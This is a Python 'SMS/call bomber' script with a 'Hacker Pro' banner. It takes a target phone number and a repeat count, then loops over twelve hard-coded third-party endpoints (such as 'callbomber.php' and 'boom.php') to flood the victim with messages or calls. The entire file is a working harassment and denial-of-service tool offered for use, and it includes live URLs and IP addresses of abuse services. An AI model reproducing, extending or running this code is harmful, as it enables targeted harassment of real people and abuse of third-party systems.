import requests
import time

# ANSI color codes for green and red
GREEN = '\033[92m'
RED = '\033[91m'
RESET = '\033[0m'

# Display the logo and tool name in green and red
logo = f"""
{GREEN} _    _            _               _____           
| |  | |          | |             |  __ \          
| |__| | __ _  ___| | _____ _ __  | |__) | __ ___  
|  __  |/ _` |/ __| |/ / _ \ '__| |  ___/ '__/ _ \ 
| |  | | (_| | (__|   <  __/ |    | |   | | | (_) |
|_|  |_|\__,_|\___|_|\_\___|_|    |_|   |_|  \___/ {RESET}
"""
print(logo)
print(f"{RED}      BOMBER TOOL BY BCT{RESET}")
print("-----------------------------------")

# List of API endpoints
api_endpoints = [
    "https://rnf.nsmodz.top/api.php?phone=",
    "http://168.119.39.20/~rnfmodsc/api/69.php?phone=",
    "http://107.150.56.100/~bct26/boom.php?phone=",
    "https://ultranetrn.com.br/fonts/api.php?number=",
    "http://api.task10.top/indexapi.php?phone=",
    "https://rnf.nsmodz.top/aapi.php?phone=",
    "http://yousuf323215.serv00.net/api/sms1.php?number=",
    "http://82.112.236.31/callbomber.php?phone=",
    "https://rafixt.my.id/bot/100api.php?phone=",
    "https://abinfotechnologies.com/wp-admin/api/pikachu-call.php?phone=",
    "http://168.119.39.20/~rnfmodsc/call/api.php?key=rafiz&num=",
    "https://serversheba.my.id/bomber/Api.php?num="
]

# Function to send requests to all APIs
def send_requests(phone_number, amount):
    print(f"Sending {amount} requests for phone number: {phone_number}")
    for i in range(amount):
        print(f"{GREEN}Request set {i+1}:{RESET}")
        for api in api_endpoints:
            full_url = api + phone_number
            try:
                response = requests.get(full_url)
                if response.status_code == 200:
                    print(f"{GREEN}Success from {api}{RESET}")
                else:
                    print(f"{RED}Failed response from {api} (status code: {response.status_code}){RESET}")
            except Exception as e:
                print(f"{RED}Error contacting {api}: {e}{RESET}")
        print("-----------------------------------")
        # Optional: delay between request sets
        time.sleep(1)

# Main loop
if __name__ == "__main__":
    phone_number = input("Enter the phone number: ")
    amount = int(input("Enter the number of times to repeat the API requests: "))
    send_requests(phone_number, amount)